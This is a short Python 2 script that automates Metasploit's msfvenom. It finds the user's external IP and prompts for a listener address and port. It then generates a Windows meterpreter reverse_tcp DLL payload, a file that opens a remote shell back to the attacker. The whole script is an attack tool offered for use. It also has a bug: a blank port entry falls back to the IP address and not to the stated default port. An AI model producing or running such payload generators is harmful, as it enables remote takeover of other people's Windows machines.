#!/usr/bin/python
# -*- coding: utf-8 -*-
#AUTHOR: EITENNE

import os, sys, time
import urllib
os.system('clear')

#/* Get eternal ip address of your network */
link = "http://ipinfo.io/ip"
data = urllib.urlopen(link)
ip = data.read()

def main():
	default = ip #/* Default configuration*/
	default2 = "8080" #/* Default configuration*/
	print """

	/==========================########========================\
	|                             #                            |
	|              #Metasploit Payload Generator#              |
	|          #Tested on Arch Linux && Debian, Kali 2.0#      |
	|———————————#—————————————————#——————————————————#—————————|
	|                        x86-DLL             EITENNE 2017  |
	\==========================================================/
	"""
	time.sleep(0.6)
	#/* Inputs and prints \ information and answers */
	print "\033[1;94m[?]\033[1;m Listener :: Listeners ip address for response"
	lhost = raw_input('\033[1;92m[+]\033[1;m listener [' + default + ']: ') or default
	print "\033[1;94m[?]\033[1;m Port :: Port for listener to get a response on"
	lport = raw_input('\033[1;92m[+]\033[1;m port [' + default2 + ']: ') or default
	payload = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f dll > payload.dll &> /dev/null" % (lhost,lport)
	print "\033[1;92m[*] Generating... \033[1;m"
	os.system(payload)
	print "\033[1;92m[*] Finished, saved as payload.dll\033[1;m"

main()
